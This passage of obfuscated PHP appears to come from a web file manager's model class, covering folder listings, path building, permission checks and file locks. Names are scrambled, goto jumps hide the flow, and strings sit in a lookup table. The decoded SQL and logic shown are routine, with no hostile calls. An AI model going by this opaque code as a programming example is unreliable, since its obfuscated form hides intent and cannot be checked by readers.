Model($B³¢™ïùŸä[422])->field($F×Ö·–º›)->where($eäóåÉ×‘)->select(); $D˜º¸ó”Åø = array_to_keyvalue($D˜º¸ó”Åø, $B³¢™ïùŸä[419]); $aŠ†ŸÃ‚­Û = Model($B³¢™ïùŸä[423])->field($B³¢™ïùŸä[424])->where($eäóåÉ×‘)->select(); goto Cğ¬¨£Ì; Cğ¬¨£Ì: $aŠ†ŸÃ‚­Û = $aŠ†ŸÃ‚­Û ? $aŠ†ŸÃ‚­Û : array(); $CŒŒ“‘°Ú’ = array(); foreach ($aŠ†ŸÃ‚­Û as $cßÅÓÆ¾Ó») { if (!isset($CŒŒ“‘°Ú’[$cßÅÓÆ¾Ó»[$B³¢™ïùŸä[419]]])) { $CŒŒ“‘°Ú’[$cßÅÓÆ¾Ó»[$B³¢™ïùŸä[419]]] = array(); } $CŒŒ“‘°Ú’[$cßÅÓÆ¾Ó»[$B³¢™ïùŸä[419]]][$cßÅÓÆ¾Ó»[$B³¢™ïùŸä[89]]] = $cßÅÓÆ¾Ó»[$B³¢™ïùŸä[359]]; } goto DÑ¦±¥¥‹; dì¿µğèØÖ: } protected function _listAppendSourceInfo(&$CÚÂ¼§ª‹°, $E ©¦ËñÂ‚) { goto A‡…¬Ì±‹ğ; aë®à…ÍÒ: $båéó†ÒÃî = array_to_keyvalue($aÇŞâª¢Œ­, $c…â„ËËš©[367]); $FñÊ¥¶ÑÖ = array_to_keyvalue_group($d†Î‡›„Ó¯, $c…â„ËËš©[75], $c…â„ËËš©[393]); $EˆÜø…Ê = array_to_keyvalue($F®Š³š´‡, $c…â„ËËš©[75]); goto C°¸Ïğ‹íØ; C°¸Ïğ‹íØ: $F“¿ãƒîÜï = array_to_keyvalue_group($aŠÚç‡è¶“, $c…â„ËËš©[369]); foreach ($CÚÂ¼§ª‹° as &$cÏ»ÌÜ³Â“) { $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]] = array($c…â„ËËš©[430] => 0, $c…â„ËËš©[431] => 0, $c…â„ËËš©[432] => 0); if (isset($EˆÜø…Ê[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]])) { $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[433]] = 1; $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[434]] = $EˆÜø…Ê[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]][$c…â„ËËš©[28]]; } if (isset($FñÊ¥¶ÑÖ[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]])) { $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[435]] = array(); foreach ($FñÊ¥¶ÑÖ[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]] as $e˜’ŠÙ‚ëî) { $BÌÜ›‰ÔÉ = $båéó†ÒÃî[$e˜’ŠÙ‚ëî]; $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[435]][] = array($c…â„ËËš©[436] => $BÌÜ›‰ÔÉ[$c…â„ËËš©[367]], $c…â„ËËš©[386] => $BÌÜ›‰ÔÉ[$c…â„ËËš©[28]], $c…â„ËËš©[437] => $BÌÜ›‰ÔÉ[$c…â„ËËš©[438]]); } } if (isset($F“¿ãƒîÜï[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]])) { $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[439]] = array(); foreach ($F“¿ãƒîÜï[$cÏ»ÌÜ³Â“[$c…â„ËËš©[369]]] as $eİˆøÁä×ö) { $cÏ»ÌÜ³Â“[$c…â„ËËš©[391]][$c…â„ËËš©[439]] = array($c…â„ËËš©[440] => $eİˆøÁä×ö[$c…â„ËËš©[441]], $c…â„ËËš©[442] => $eİˆøÁä×ö[$c…â„ËËš©[443]], $c…â„ËËš©[444] => $eİˆøÁä×ö[$c…â„ËËš©[369]], $c…â„ËËš©[445] => $eİˆøÁä×ö[$c…â„ËËš©[446]], $c…â„ËËš©[447] => $eİˆøÁä×ö[$c…â„ËËš©[448]]); } } } return $CÚÂ¼§ª‹°; goto Eƒ³ÙŠù³²; A‡…¬Ì±‹ğ: $c…â„ËËš© =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($c…â„ËËš©[427])) { return; } $aÇŞâª¢Œ­ = Model($c…â„ËËš©[428])->listData(); goto aÈ†÷ï³Â•; aÈ†÷ï³Â•: $d†Î‡›„Ó¯ = Model($c…â„ËËš©[392])->listData(); $F®Š³š´‡ = Model($c…â„ËËš©[381])->listData(); $aŠÚç‡è¶“ = Model($c…â„ËËš©[429])->listSimple(); goto aë®à…ÍÒ; Eƒ³ÙŠù³²: } protected function _listAppendChildren(&$aÁ§à±Ñ, $EÒÎ—ôàËµ) { goto c³‹èÊŸà‰; c³‹èÊŸà‰: $fçÕ…¥ë¬Í =& $_SERVER[¼€¼ˆ¦‚¡]; $DŸ´Œë—‘ì = $fçÕ…¥ë¬Í[361]; $b£ó™¾ø = array(); goto b„ƒòƒö÷İ; BÀªÖ‘: foreach ($aÁ§à±Ñ as &$d¥Ñ‘è±åŞ) { if ($d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[370]]) { unset($d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[372]]); $d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[192]] = intval($b£ó™¾ø[$d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[369]] . $fçÕ…¥ë¬Í[451]][$fçÕ…¥ë¬Í[452]]); $d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[191]] = intval($b£ó™¾ø[$d¥Ñ‘è±åŞ[$fçÕ…¥ë¬Í[369]] . $fçÕ…¥ë¬Í[453]][$fçÕ…¥ë¬Í[452]]); } } goto dòçÚÊÁá; b„ƒòƒö÷İ: $dÙùÌîóÖ = 1024 * 50; $aÁ§à±Ñ = is_array($aÁ§à±Ñ) ? $aÁ§à±Ñ : array(); $F·«…®ãö® = count($aÁ§à±Ñ); goto Fİ‡”Ú÷Ë‹; Fİ‡”Ú÷Ë‹: $A’‡Ô…³¢Ü = $this->tablePrefix . $this->tableName; for ($bò×ë¢ßÊ = 0; $bò×ë¢ßÊ < $F·«…®ãö®; $bò×ë¢ßÊ++) { $a¤¨»Æù”ò = intval($aÁ§à±Ñ[$bò×ë¢ßÊ][$fçÕ…¥ë¬Í[397]]); if ($aÁ§à±Ñ[$bò×ë¢ßÊ][$fçÕ…¥ë¬Í[370]]) { $FÙàÜ·ïÚî = $aÁ§à±Ñ[$bò×ë¢ßÊ][$fçÕ…¥ë¬Í[369]]; $DŸ´Œë—‘ì .= "\123\x45\114\x45\103\x54\40\x2a\x20\106\x52\117\x4d\40\50\123\x45\114\105\103\x54\40\x27{$FÙàÜ·ïÚî}\137\150\141\x73\106\151\x6c\145\47\40\x61\x73\x20\150\x61\163\54\143\157\165\x6e\164\x28\x31\51\40\x61\x73\40\150\x61\163\x43\157\x75\x6e\x74\40\106\122\x4f\115\40\x60{$A’‡Ô…³¢Ü}\140\x20\12\x9\x9\x9\11\x9\167\150\145\162\x65\40\160\x61\162\145\x6e\164\x49\104\x3d{$FÙàÜ·ïÚî}\x20\x61\156\144\x20\x69\163\x46\x6f\154\144\x65\x72\75\x30\40\x61\x6e\x64\x20\x69\x73\104\x65\x6c\145\x74\x65\75{$a¤¨»Æù”ò}\51\40\x61\163\40\164\142\61\x5f{$FÙàÜ·ïÚî}\x20\165\x6e\151\x6f\156\x20\141\x6c\x6c\40\xa\11\11\11\11\x9\123\x45\114\x45\x43\x54\x20\52\40\x46\122\117\115\40\50\123\x45\x4c\x45\x43\124\x20\47{$FÙàÜ·ïÚî}\x5f\150\x61\x73\x46\157\x6c\144\145\162\x27\x20\141\x73\40\150\x61\163\106\x69\x6c\145\x2c\x63\157\x75\156\x74\50\x31\x29\40\x61\x73\40\150\x61\x73\103\157\x75\x6e\x74\40\x46\122\117\x4d\40\x60{$A’‡Ô…³¢Ü}\140\40\12\x9\x9\11\11\x9\167\150\145\162\145\40\x70\141\x72\145\156\x74\111\x44\x3d{$FÙàÜ·ïÚî}\x20\141\156\x64\x20\151\x73\x46\157\x6c\144\x65\x72\x3d\x31\x20\x61\x6e\144\40\151\163\x44\145\154\145\x74\145\75{$a¤¨»Æù”ò}\x29\x20\141\x73\x20\x74\x62\62\x5f{$FÙàÜ·ïÚî}\40\165\x6e\x69\157\156\x20\141\154\x6c\40"; } if ((strlen($DŸ´Œë—‘ì) >= $dÙùÌîóÖ || $bò×ë¢ßÊ == $F·«…®ãö® - 1) && $DŸ´Œë—‘ì) { $DŸ´Œë—‘ì = substr($DŸ´Œë—‘ì, 0, -strlen($fçÕ…¥ë¬Í[449])); $e¥•³Æ•¬’ = $this->query($DŸ´Œë—‘ì); $b£ó™¾ø = array_merge($b£ó™¾ø, $e¥•³Æ•¬’); $DŸ´Œë—‘ì = $fçÕ…¥ë¬Í[33]; } } $b£ó™¾ø = array_to_keyvalue($b£ó™¾ø, $fçÕ…¥ë¬Í[450]); goto BÀªÖ‘; dòçÚÊÁá: } protected function _listAppendAuth(&$D“Ì¾ŒŒ²) { goto C¯Ä«Ó¤„ğ; eˆª˜ÂøÎğ: $e¤ìÒ½ŠÇÍ = Model($d…ãˆîª¥[454])->getSourceList($c§ÏÓÓÓ·, $AËé“ÖèŠÅ); foreach ($D“Ì¾ŒŒ² as $cöÌÖ˜±½Ù => &$Fƒ‡¦±ƒ–) { $Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]] = $e¤ìÒ½ŠÇÍ[$Fƒ‡¦±ƒ–[$d…ãˆîª¥[369]]]; if (!$Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]] && $Fƒ‡¦±ƒ–[$d…ãˆîª¥[371]] == self::TYPE_GROUP) { $Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]] = Action($d…ãˆîª¥[455])->pathGroupAuthMake($Fƒ‡¦±ƒ–[$d…ãˆîª¥[456]]); if (!$Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]] && !_get($GLOBALS, $d…ãˆîª¥[457])) { $Fƒ‡¦±ƒ–[$d…ãˆîª¥[189]] = !1; $Fƒ‡¦±ƒ–[$d…ãˆîª¥[188]] = !1; } } if ($Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]]) { $Fƒ‡¦±ƒ–[$d…ãˆîª¥[189]] = AuthModel::authCheckEdit($Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]][$d…ãˆîª¥[377]]); $Fƒ‡¦±ƒ–[$d…ãˆîª¥[188]] = AuthModel::authCheckView($Fƒ‡¦±ƒ–[$d…ãˆîª¥[376]][$d…ãˆîª¥[377]]); } $this->groupPathDisplay($Fƒ‡¦±ƒ–); } goto BÆñ„–³å—; AŠĞ³Îê­”: foreach ($D“Ì¾ŒŒ² as $Fƒ‡¦±ƒ–) { if ($Fƒ‡¦±ƒ–[$d…ãˆîª¥[371]] == self::TYPE_GROUP) { $c§ÏÓÓÓ·[] = $Fƒ‡¦±ƒ–[$d…ãˆîª¥[369]]; } } if (!$c§ÏÓÓÓ·) { return; } $AËé“ÖèŠÅ = array_to_keyvalue($D“Ì¾ŒŒ², $d…ãˆîª¥[369]); goto eˆª˜ÂøÎğ; C¯Ä«Ó¤„ğ: $d…ãˆîª¥ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($d…ãˆîª¥[427])) { return; } $c§ÏÓÓÓ· = array(); goto AŠĞ³Îê­”; BÆñ„–³å—: } public function groupPathDisplay(&$B¬×öÕä©š) { goto d¼ÙÎç°Ô¸; d»Ä—¡Š•“: $DÙ—å•ñ¼è = $this->parentLevelArray($aİÌ÷‡Ğµ[$bÉÏá¼œÛà[459]]); $B»òÅö¿ƒ = $bÉÏá¼œÛà[33]; foreach ($DÙ—å•ñ¼è as $EÚÚ¯ÄŠ—ù) { $C¹ˆ°Ö‡©ñ = Model($bÉÏá¼œÛà[458])->getInfo($EÚÚ¯ÄŠ—ù); $B»òÅö¿ƒ .= $C¹ˆ°Ö‡©ñ[$bÉÏá¼œÛà[391]][$bÉÏá¼œÛà[369]] . $bÉÏá¼œÛà[47]; } goto C§×Î“»º™; d¼ÙÎç°Ô¸: $bÉÏá¼œÛà =& $_SERVER[¼€¼ˆ¦‚¡]; if ($B¬×öÕä©š[$bÉÏá¼œÛà[371]] != self::TYPE_GROUP) { return; } $aİÌ÷‡Ğµ = Model($bÉÏá¼œÛà[458])->getInfo($B¬×öÕä©š[$bÉÏá¼œÛà[456]]); goto d»Ä—¡Š•“; C§×Î“»º™: $B¬×öÕä©š[$bÉÏá¼œÛà[460]] = $aİÌ÷‡Ğµ[$bÉÏá¼œÛà[461]]; $B¬×öÕä©š[$bÉÏá¼œÛà[380]] = $aİÌ÷‡Ğµ[$bÉÏá¼œÛà[459]]; $B¬×öÕä©š[$bÉÏá¼œÛà[462]] = $aİÌ÷‡Ğµ[$bÉÏá¼œÛà[463]]; goto C«Œ¶æ•Ù„; C«Œ¶æ•Ù„: $B¬×öÕä©š[$bÉÏá¼œÛà[464]] = $B»òÅö¿ƒ . $aİÌ÷‡Ğµ[$bÉÏá¼œÛà[391]][$bÉÏá¼œÛà[369]]; goto b¥ùÕíà¾±; b¥ùÕíà¾±: } protected function _listAppendPath(&$D•’‰÷ÚÊ) { goto B¡ùËÀŠ©¡; B¡ùËÀŠ©¡: $bĞà¥¾Ó¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $BœŠœÊ¹ÔÁ = array(); foreach ($D•’‰÷ÚÊ as &$dœ÷ïÓİ™¬) { $BœŠœÊ¹ÔÁ[$dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[369]]] = $dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[28]]; $A…¿¹ƒ¨”˜ = $this->parentLevelArray($dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[459]]); array_shift($A…¿¹ƒ¨”˜); foreach ($A…¿¹ƒ¨”˜ as $dĞÅ†‡œ‡Æ) { if (!isset($BœŠœÊ¹ÔÁ[$dĞÅ†‡œ‡Æ])) { $BœŠœÊ¹ÔÁ[$dĞÅ†‡œ‡Æ] = 0; } } } goto dè§ì—¬‰õ; AÒíæÒÕ·: $cÇŞ–¢è¢½ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D•’‰÷ÚÊ as &$dœ÷ïÓİ™¬) { goto dÌ×Ó‚ñô; dÌ×Ó‚ñô: $A…¿¹ƒ¨”˜ = $this->parentLevelArray($dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[459]]); $D¥õù‡ïò® = $this->_listAppendPathRoot($dœ÷ïÓİ™¬, $A…¿¹ƒ¨”˜); foreach ($A…¿¹ƒ¨”˜ as $dĞÅ†‡œ‡Æ) { if (isset($BœŠœÊ¹ÔÁ[$dĞÅ†‡œ‡Æ])) { $D¥õù‡ïò® .= $BœŠœÊ¹ÔÁ[$dĞÅ†‡œ‡Æ] . $bĞà¥¾Ó¶[8]; } } goto E­ÎÏâø“Ì; E­ÎÏâø“Ì: if ($A…¿¹ƒ¨”˜) { $D¥õù‡ïò® .= $dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[28]]; } if ($dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[370]]) { $D¥õù‡ïò® .= $bĞà¥¾Ó¶[8]; } $dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[466]] = str_replace($bĞà¥¾Ó¶[467], $bĞà¥¾Ó¶[8], $D¥õù‡ïò®); goto bÎ¼çÌ†Ø¯; bÎ¼çÌ†Ø¯: $eÄõˆÜôÓº = trim($dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[466]], $bĞà¥¾Ó¶[8]); if ($dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[461]] == $bĞà¥¾Ó¶[468] && $eÄõˆÜôÓº) { $dœ÷ïÓİ™¬[$bĞà¥¾Ó¶[28]] = $eÄõˆÜôÓº; } $this->_listAppendPathRecycle($dœ÷ïÓİ™¬, $A…¿¹ƒ¨”˜, $cÇŞ–¢è¢½); goto B©©ä’¾„; B©©ä’¾„: } goto aã¶ô’í™ì; dè§ì—¬‰õ: $B¦‡ã‚ĞÌ© = array(); foreach ($BœŠœÊ¹ÔÁ as $F÷‘ÕÔ°èÅ => $eóÛ‘ôÚ¹) { if (!$eóÛ‘ôÚ¹) { $B¦‡ã‚ĞÌ©[] = $F÷‘ÕÔ°èÅ; } } if ($B¦‡ã‚ĞÌ©) { $E‚‘†ÀçÄ¬ = array($bĞà¥¾Ó¶[383] => array($bĞà¥¾Ó¶[384], $B¦‡ã‚ĞÌ©)); if (count($B¦‡ã‚ĞÌ©) == 1) { $fà“¾÷š = $this->sourceInfo($B¦‡ã‚ĞÌ©[0]); $fà“¾÷š = is_array($fà“¾÷š) ? array($fà“¾÷š) : !1; } else { $fà“¾÷š = $this->field($bĞà¥¾Ó¶[465])->where($E‚‘†ÀçÄ¬)->select(); } $aÄŠ—İö¨Ë = array_to_keyvalue($fà“¾÷š, $bĞà¥¾Ó¶[369], $bĞà¥¾Ó¶[28]); $BœŠœÊ¹ÔÁ = array_merge_index($BœŠœÊ¹ÔÁ, $aÄŠ—İö¨Ë); } goto AÒíæÒÕ·; aã¶ô’í™ì: } private function _listAppendPathRecycle(&$aõ»êíéÄ¼, $BœÂòâ¨‚°, $D„¾ˆ¼Ê†) { goto a±’šä—…õ; eÙÌˆßğ…ç: $Dñó‹—‡•‡ = explode($BŠË¢Šòï[8], trim($aõ»êíéÄ¼[$BŠË¢Šòï[466]], $BŠË¢Šòï[8])); $c§ØÑÆùö = implode($BŠË¢Šòï[8], array_slice($Dñó‹—‡•‡, 2)); $aõ»êíéÄ¼[$BŠË¢Šòï[466]] = $BŠË¢Šòï[8] . LNG($BŠË¢Šòï[469]) . $BŠË¢Šòï[8] . ltrim($c§ØÑÆùö, $BŠË¢Šòï[8]); goto EÂ»µµ×½¯; EÂ»µµ×½¯: $aõ»êíéÄ¼[$BŠË¢Šòï[459]] = $BŠË¢Šòï[470] . implode($BŠË¢Šòï[47], array_slice($BœÂòâ¨‚°, 1)) . $BŠË¢Šòï[47]; if ($aõ»êíéÄ¼[$BŠË¢Šòï[369]] == $D„¾ˆ¼Ê†) { $aõ»êíéÄ¼[$BŠË¢Šòï[459]] = $BŠË¢Šòï[470]; $aõ»êíéÄ¼[$BŠË¢Šòï[461]] = $BŠË¢Šòï[468]; $aõ»êíéÄ¼[$BŠË¢Šòï[28]] = LNG($BŠË¢Šòï[469]); } $aõ»êíéÄ¼[$BŠË¢Šòï[471]] = $BŠË¢Šòï[472]; goto EÌ·Ã¯Ïˆ’; a±’šä—…õ: $BŠË¢Šòï =& $_SERVER[¼€¼ˆ¦‚¡]; if (intval($aõ»êíéÄ¼[$BŠË¢Šòï[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($D„¾ˆ¼Ê†, $BœÂòâ¨‚°) && $aõ»êíéÄ¼[$BŠË¢Šòï[369]] != $D„¾ˆ¼Ê†) { return; } goto eÙÌˆßğ…ç; EÌ·Ã¯Ïˆ’: } protected function _listAppendPathRoot(&$DÇ‚¾±àöƒ, $eäºî à“¸) { $a¶ âÑ¯® =& $_SERVER[¼€¼ˆ¦‚¡]; $F…Á‚‘ÓËÌ = $a¶ âÑ¯®[33]; if ($DÇ‚¾±àöƒ[$a¶ âÑ¯®[371]] == self::TYPE_USER) { if (defined($a¶ âÑ¯®[427]) && $DÇ‚¾±àöƒ[$a¶ âÑ¯®[456]] == USER_ID) { $F…Á‚‘ÓËÌ = LNG($a¶ âÑ¯®[473]); if (!$eäºî à“¸) { $DÇ‚¾±àöƒ[$a¶ âÑ¯®[28]] = $F…Á‚‘ÓËÌ; } } else { $b»ïíä¿Ùå = Model($a¶ âÑ¯®[474])->getInfoSimple($DÇ‚¾±àöƒ[$a¶ âÑ¯®[456]]); $F…Á‚‘ÓËÌ = LNG($a¶ âÑ¯®[475]) . $a¶ âÑ¯®[157] . $b»ïíä¿Ùå[$a¶ âÑ¯®[28]] . $a¶ âÑ¯®[476]; } } else { if ($DÇ‚¾±àöƒ[$a¶ âÑ¯®[371]] == self::TYPE_GROUP) { $b»ïíä¿Ùå = Model($a¶ âÑ¯®[458])->getInfoSimple($DÇ‚¾±àöƒ[$a¶ âÑ¯®[456]]); $F…Á‚‘ÓËÌ = $b»ïíä¿Ùå[$a¶ âÑ¯®[28]]; } else { if ($DÇ‚¾±àöƒ[$a¶ âÑ¯®[371]] == self::TYPE_SYSTEM) { $b»ïíä¿Ùå = $this->sourceInfo($eäºî à“¸[0], !0); $F…Á‚‘ÓËÌ = $b»ïíä¿Ùå[$a¶ âÑ¯®[28]]; } } } $F…Á‚‘ÓËÌ = $F…Á‚‘ÓËÌ ? $a¶ âÑ¯®[8] . $F…Á‚‘ÓËÌ . $a¶ âÑ¯®[8] : $a¶ âÑ¯®[8]; return $F…Á‚‘ÓËÌ; } protected function _listAppendUser(&$a¯áñŒ‚±è) { $dÜ³øöæ¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $B›½‘Ç÷† = array_to_keyvalue($a¯áñŒ‚±è, $dÜ³øöæ¯[33], $dÜ³øöæ¯[378]); $bçî‰¿¿æ = array_to_keyvalue($a¯áñŒ‚±è, $dÜ³øöæ¯[33], $dÜ³øöæ¯[379]); $cóË¬åÀ¨ø = array_merge($B›½‘Ç÷†, $bçî‰¿¿æ); $Bä‘¨·ğá = Model($dÜ³øöæ¯[477])->userListInfo($cóË¬åÀ¨ø); foreach ($a¯áñŒ‚±è as &$E´„¡ğ‰Ç) { $A°óœßæ¸† = $E´„¡ğ‰Ç[$dÜ³øöæ¯[378]]; $E´„¡ğ‰Ç[$dÜ³øöæ¯[378]] = $Bä‘¨·ğá[$A°óœßæ¸†] ? $Bä‘¨·ğá[$A°óœßæ¸†] : !1; $A°óœßæ¸† = $E´„¡ğ‰Ç[$dÜ³øöæ¯[379]]; $E´„¡ğ‰Ç[$dÜ³øöæ¯[379]] = $Bä‘¨·ğá[$A°óœßæ¸†] ? $Bä‘¨·ğá[$A°óœßæ¸†] : !1; if (isset($E´„¡ğ‰Ç[$dÜ³øöæ¯[417]]) && $E´„¡ğ‰Ç[$dÜ³øöæ¯[417]][$dÜ³øöæ¯[478]]) { $E±‰ó•œ· = $GLOBALS[$dÜ³øöæ¯[6]][$dÜ³øöæ¯[84]][$dÜ³øöæ¯[479]]; if ($E´„¡ğ‰Ç[$dÜ³øöæ¯[417]][$dÜ³øöæ¯[480]] <= time() - $E±‰ó•œ·) { $this->metaSet($E´„¡ğ‰Ç[$dÜ³øöæ¯[369]], $dÜ³øöæ¯[478], null); $this->metaSet($E´„¡ğ‰Ç[$dÜ³øöæ¯[369]], $dÜ³øöæ¯[480], null); unset($E´„¡ğ‰Ç[$dÜ³øöæ¯[417]][$dÜ³øöæ¯[478]]); continue; } $Cõ‚ÔíÇãä = $E´„¡ğ‰Ç[$dÜ³øöæ¯[417]][$dÜ³øöæ¯[478]]; $E´„¡ğ‰Ç[$dÜ³øöæ¯[417]][$dÜ³øöæ¯[481]] = Model($dÜ³øöæ¯[477])->getInfoSimpleOuter($Cõ‚ÔíÇãä); } } } public function parentLevelArray($FáÇ™„¨ô) { $a¾ô‡§‘¢ê =& $_SERVER[¼€¼ˆ¦‚¡]; $FáÇ™„¨ô = explode($a¾ô‡§‘¢ê[47], trim($FáÇ™„¨ô, $a¾ô‡§‘¢ê[47])); return array_remove_value($FáÇ™„¨ô, $a¾ô‡§‘¢ê[468]); } public function listAll($a‰•ùÖã–ã) { goto c”åÜØØ²”; Fâø˜çÁ£: $BçˆÙò  = array_to_keyvalue($BçˆÙò , $dáÕÖ’‡†Ü[369]); $CÆëÆ—„ñ† = "\57{$d•¥”È¬™[$dáÕÖ’‡†Ü[28]]}\x2f"; $CÆëÆ—„ñ† = $CÆëÆ—„ñ† == $dáÕÖ’‡†Ü[467] ? $dáÕÖ’‡†Ü[8] : $CÆëÆ—„ñ†; goto a‚ñ®×âÏ; a‚ñ®×âÏ: $Fƒ“¼¬À = array(); foreach ($BçˆÙò  as $c¸¸Ë ã«¼ => $AÛ‘áéÓ‹ˆ) { goto fÖÛĞÀ·ó; fÖÛĞÀ·ó: $d¾›Äïæ¯“ = $this->parentLevelArray($AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[459]]); array_shift($d¾›Äïæ¯“); $còŞÂ´´Í = $CÆëÆ—„ñ†; goto bãÍñÉ®ÒÈ; FÏ ¨‚°±: if (!$AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[370]]) { $F¥ãÇ„êŒ[$dáÕÖ’‡†Ü[419]] = $AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[419]]; $F¥ãÇ„êŒ[$dáÕÖ’‡†Ü[489]] = $AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[75]]; } $Fƒ“¼¬À[] = $F¥ãÇ„êŒ; goto B×ñ¨‰¤½Í; bãÍñÉ®ÒÈ: for ($Fø…”†Ñ† = 0; $Fø…”†Ñ† < count($d¾›Äïæ¯“); $Fø…”†Ñ†++) { $còŞÂ´´Í .= $BçˆÙò [$d¾›Äïæ¯“[$Fø…”†Ñ†]][$dáÕÖ’‡†Ü[28]] . $dáÕÖ’‡†Ü[8]; } $còŞÂ´´Í .= $AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[28]]; if ($AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[370]]) { $còŞÂ´´Í .= $dáÕÖ’‡†Ü[8]; } goto aåù»µİ; aåù»µİ: $còŞÂ´´Í = str_replace($dáÕÖ’‡†Ü[467], $dáÕÖ’‡†Ü[8], $còŞÂ´´Í); $còŞÂ´´Í = str_replace($dáÕÖ’‡†Ü[467], $dáÕÖ’‡†Ü[8], $còŞÂ´´Í); $F¥ãÇ„êŒ = array($dáÕÖ’‡†Ü[387] => str_replace($dáÕÖ’‡†Ü[467], $dáÕÖ’‡†Ü[8], $còŞÂ´´Í), $dáÕÖ’‡†Ü[488] => intval($AÛ‘áéÓ‹ˆ[$dáÕÖ’‡†Ü[370]]), $dáÕÖ’‡†Ü[391] => $this->pathInfoFilter($AÛ‘áéÓ‹ˆ, !0)); goto FÏ ¨‚°±; B×ñ¨‰¤½Í: } return $Fƒ“¼¬À; goto eĞ½¯„±Ğî; F¶’–—›Ç²: $this->_listAppendAuth($BçˆÙò ); $this->_listAppendUser($BçˆÙò ); $this->_listAppendPath($BçˆÙò ); goto Fâø˜çÁ£; c”åÜØØ²”: $dáÕÖ’‡†Ü =& $_SERVER[¼€¼ˆ¦‚¡]; $d•¥”È¬™ = $this->sourceInfo($a‰•ùÖã–ã); $bé‘ºæ¦ Ì = array($dáÕÖ’‡†Ü[482] => array($dáÕÖ’‡†Ü[483], $d•¥”È¬™[$dáÕÖ’‡†Ü[459]] . $a‰•ùÖã–ã . $dáÕÖ’‡†Ü[484]), $dáÕÖ’‡†Ü[485] => 0); goto dØÕ—Ñèœ·; dØÕ—Ñèœ·: $d•À¾Íèá = $dáÕÖ’‡†Ü[486]; $b‰á‡¸ŠÂ‘ = "\114\x45\106\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\40\x66\x69\x6c\145\x20\x6f\156\40\163\157\165\x72\x63\x65\x2e\x66\x69\154\x65\111\104\x20\75\x20\x66\x69\154\145\x2e\x66\151\154\145\x49\x44"; $BçˆÙò  = $this->alias($dáÕÖ’‡†Ü[487])->field($d•À¾Íèá)->where($bé‘ºæ¦ Ì)->join($b‰á‡¸ŠÂ‘)->select(); goto F¶’–—›Ç²; eĞ½¯„±Ğî: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($AĞ‰ÎØÀ‘) { goto b­†ÍÏí¹Ò; b´°Ôâà•Ê: $dí²Ö ¤— = 1; $this->_lockEvent($AĞ‰ÎØÀ‘, array($C­°£‡¼è³[491], $C­°£‡¼è³[492]), $dí²Ö ¤—); $this->_lockParent($AĞ‰ÎØÀ‘, array($C­°£‡¼è³[492]), $dí²Ö ¤—); goto bìİøÖ¤ñ×; b­†ÍÏí¹Ò: $C­°£‡¼è³ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($C­°£‡¼è³[490], $AĞ‰ÎØÀ‘); goto b´°Ôâà•Ê; bìİøÖ¤ñ×: $this->_lockEvent($AĞ‰ÎØÀ‘, array($C­°£‡¼è³[493], $C­°£‡¼è³[494]), $dí²Ö ¤—); $this->_lockCheckEnd($C­°£‡¼è³[490], $AĞ‰ÎØÀ‘); goto F‘ŒÂòÄĞ‘; F‘ŒÂòÄĞ‘: } public function lockCopyEnd($Eœ—áÕ¨‹) { $bíšÀô¿Ÿ¯ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $DïñÎˆ°ºØ = 0; $this->_lockEvent($Eœ—áÕ¨‹, array($bíšÀô¿Ÿ¯[491], $bíšÀô¿Ÿ¯[492]), $DïñÎˆ°ºØ); $this->_lockParent($Eœ—áÕ¨‹, array($bíšÀô¿Ÿ¯[492]), $DïñÎˆ°ºØ); $this->_lockEvent($Eœ—áÕ¨‹, array($bíšÀô¿Ÿ¯[493], $bíšÀô¿Ÿ¯[494]), $DïñÎˆ°ºØ); } public function lockWriteStart($Bâ¬ïÚâ¿, $f§Ëˆƒ ±± = '') { goto DÒàíùæÕ; b¨Æ š¥ŒÈ: $b¡¦¦—ªæö = 1; $this->_lockKey($dšä‹Ë•Ä[495] . 